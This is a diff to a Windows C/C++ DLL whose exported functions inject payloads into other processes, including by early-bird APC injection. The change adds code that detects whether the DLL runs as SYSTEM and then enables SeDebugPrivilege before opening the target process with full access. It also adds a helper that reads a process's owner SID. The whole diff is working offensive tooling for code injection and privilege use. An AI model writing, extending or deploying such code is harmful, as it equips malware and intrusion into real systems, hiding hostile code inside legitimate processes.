@@ -2,6 +2,11 @@
 #include "pch.h"
 #include <stdio.h>
 #include <tlhelp32.h>
+#include <sddl.h>
+
+BOOL EnableDebugPrivilege();
+PSID GetProcessSID(HANDLE hProcess);
+BOOL IsSystemUser();
 
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
@@ -56,6 +61,10 @@ extern "C" __declspec(dllexport) int InjectPayloadSimple(DWORD pid, unsigned cha
     HANDLE hProcess;
     HANDLE hThread;
     PVOID remoteBuffer;
+
+    if (IsSystemUser()) {
+        EnableDebugPrivilege();
+    }
 
     hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProcess)
@@ -231,3 +240,54 @@ extern "C" __declspec(dllexport) int InjectPayloadApcEarlyBird(const char* targe
     return 0;
 }
 
+BOOL EnableDebugPrivilege() {
+    HANDLE hToken;
+    TOKEN_PRIVILEGES tp;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return FALSE;
+    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid)) return FALSE;
+
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    BOOL res = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
+    CloseHandle(hToken);
+    return res && (GetLastError() == ERROR_SUCCESS);
+}
+
+PSID GetProcessSID(HANDLE hProcess) {
+    HANDLE hToken;
+    DWORD dwLength = 0;
+    PTOKEN_USER pTokenUser = NULL;
+    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) return NULL;
+    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwLength);
+    pTokenUser = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), 0, dwLength);
+    if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwLength, &dwLength)) {
+        PSID pSid = (PSID)HeapAlloc(GetProcessHeap(), 0, GetLengthSid(pTokenUser->User.Sid));
+        CopySid(GetLengthSid(pTokenUser->User.Sid), pSid, pTokenUser->User.Sid);
+        HeapFree(GetProcessHeap(), 0, pTokenUser);
+        CloseHandle(hToken);
+        return pSid;
+    }
+    CloseHandle(hToken);
+    return NULL;
+}
+
+BOOL IsSystemUser() {
+    HANDLE hToken;
+    UCHAR tokenInfo[MAX_PATH];
+    DWORD dwLength = 0;
+    BOOL isSystem = FALSE;
+
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+        if (GetTokenInformation(hToken, TokenUser, tokenInfo, sizeof(tokenInfo), &dwLength)) {
+            PSID systemSid = NULL;
+            if (ConvertStringSidToSidA("S-1-5-18", &systemSid)) {
+                if (EqualSid(((PTOKEN_USER)tokenInfo)->User.Sid, systemSid)) {
+                    isSystem = TRUE;
+                }
+                LocalFree(systemSid);
+            }
+        }
+        CloseHandle(hToken);
+    }
+    return isSystem;
+}
